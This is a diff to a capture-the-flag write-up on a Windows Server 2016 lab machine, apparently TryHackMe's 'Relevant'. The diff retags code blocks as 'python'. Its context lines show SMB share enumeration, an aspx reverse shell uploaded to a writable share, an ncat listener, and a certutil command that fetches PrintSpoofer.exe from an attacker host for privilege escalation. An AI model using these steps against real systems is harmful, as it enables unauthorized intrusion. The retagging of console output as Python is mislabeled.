@@ -18,7 +18,7 @@ As always we start with rustscan I like its style and it instantly gives a respo
 rustscan -a $IP -- -A -sC -oN nmap.txt
 ````````
 
-````````
+````````python
 .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
 | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
 | .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
@@ -235,7 +235,7 @@ so we have port 135,445 open let us try to login in with anonymous login.
 smbclient -L \\\\$IP\\
 ````````
 
-````````
+````````python
 Password for [WORKGROUP\root]:
 
 	Sharename       Type      Comment
@@ -255,7 +255,7 @@ we have few shares. the three is the default one. the interesting one is nt4wrks
 smbclient \\\\$IP\\nt4wrksv 
 ````````
 
-````````
+````````python
 Password for [WORKGROUP\root]:
 Try "help" to get a list of possible commands.
 smb: \> ls
@@ -294,7 +294,7 @@ I will provide an aspx reverse shell payload. you need to change its IP and port
 smbclient \\\\$IP\\nt4wrksv
 ````````
 
-````````
+````````python
 Password for [WORKGROUP\root]:
 Try "help" to get a list of possible commands.
 smb: \> put shell.aspx 
@@ -313,7 +313,7 @@ Let's execute the aspx reverse shell...
 
 YESS!! we have gained access to our target machine
 
-````````
+````````python
 Ncat: Version 7.92 ( https://nmap.org/ncat )
 Ncat: Listening on :::1234
 Ncat: Listening on 0.0.0.0:1234
@@ -334,7 +334,7 @@ Now, we can get our first flag.
 
 ## Getting user.txt flag 
 
-````````
+````````python
 c:\Windows\System32\inetsrv>cd c:\Users\Bob\Desktop
 cd c:\Users\Bob\Desktop
 
@@ -365,7 +365,7 @@ so we have our first flag. let's escalate our privileges for getting the second 
 systeminfo
 ````````
 
-````````
+````````python
 
 Host Name:                 RELEVANT
 OS Name:                   Microsoft Windows Server 2016 Standard Evaluation
@@ -419,7 +419,7 @@ Okay, this is a Windows Server 2016. let's check our privileges on the machine.
 whomai /priv 
 ````````
 
-````````
+````````python
 PRIVILEGES INFORMATION
 ----------------------
 
@@ -452,7 +452,7 @@ certutil.exe -urlcache -f http://YOUR_IP/PrintSpoofer.exe PrintSpoofer.exe
 
 ### Getting Root.txt
 
-````````
+````````python
 c:\Users\Bob\Desktop>certutil.exe -urlcache -f http://10.8.126.243/PrintSpoofer.exe PrintSpoofer.exe
 certutil.exe -urlcache -f http://10.8.126.243/PrintSpoofer.exe PrintSpoofer.exe
 ****  Online  ****
